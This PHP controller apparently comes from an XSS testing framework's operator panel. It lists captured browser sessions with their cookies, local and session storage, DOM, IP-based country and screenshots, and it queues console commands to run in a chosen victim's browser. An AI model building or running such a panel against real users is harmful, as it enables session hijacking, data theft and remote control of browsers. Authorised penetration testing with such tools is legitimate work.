<?php
use GeoIp2\Database\Reader;

class Persistent extends Controller 
{
    /**
     * Summary of rows
     * 
     * @var array
     */
    private $rows = ['id', 'uri', 'ip', 'referer', 'payload', 'user-agent', 'cookies', 'localstorage', 'sessionstorage', 'dom', 'origin', 'clientid', 'browser', 'last'];

    public function all()
    {
        $this->isLoggedInOrExit();
        $this->view->setTitle('Online');
        $this->view->renderTemplate('persistent/index');

        $this->view->renderCondition('hasReports', true);

        $sessions = $this->model('Session')->getAll();

        $reader = new Reader(__DIR__ . '/../../GeoLite2-Country.mmdb');

        foreach ($sessions as $key => $value) {
            $record = $reader->country($sessions[$key]['ip']);
            $sessions[$key]['browser'] = $this->parseUserAgent($sessions[$key]['user-agent']);
            $sessions[$key]['country'] = strtolower($record->country->isoCode ?? 'xx');
            $sessions[$key]['last'] = $this->parseTimestamp($sessions[$key]['time'], 'long');
            $sessions[$key]['shorturi'] = substr($sessions[$key]['uri'], 0, 50);
        }

        $this->view->renderDataset('session', $sessions);

        return $this->showContent();
    }

    public function session($clientId) 
    {
        $this->isLoggedInOrExit();
        $this->view->setTitle('Online');
        $this->view->renderTemplate('persistent/session');

        $clientId = explode('~', $clientId ?? '');
        $origin = $clientId[1] ?? '';
        $clientId = $clientId[0] ?? '';

        $session = $this->model('Session')->getByClientId($clientId, $origin);

        // Check report permissions
        // todo

        if($this->isPOST()) {
            try {
                $this->validateCsrfToken();

                $this->view->setContentType('application/json');

                // Check if posted data is executing command
                if ($this->getPostValue('execute') !== null) {
                    $command = $this->getPostValue('command');
                    $this->model('Console')->add($clientId, $origin, $command);
                    return json_encode(1);
                }

                // Check if posted data is getting console data
                if ($this->getPostValue('getconsole') !== null) {
                    $console = $this->model('Session')->getAllConsole($clientId, $origin);
                    return json_encode(['console' => $console]);
                }
            } catch (Exception $e) {
                $this->view->renderMessage($e->getMessage());
            }
        }

        // Render all rows
        $screenshot = !empty($session['screenshot']) ? '<img src="/assets/img/report-' . e($session['screenshot']) . '.png" style="max-width:100%">' : '';
        $this->view->renderData('screenshot', $screenshot, true);
        $this->view->renderData('time', date('F j, Y, g:i a', $session['time']));
        $session['browser'] = $this->parseUserAgent($session['user-agent']);
        $session['last'] = $this->parseTimestamp($session['time'], 'long');

        $console = $this->model('Session')->getAllConsole($clientId, $origin);
        $this->view->renderData('console', $console);

        foreach ($this->rows as $value) {
            $this->view->renderData($value, $session[$value]);
        }

        return $this->showContent();

    }

    public function view($id)
    {
        //
    }

}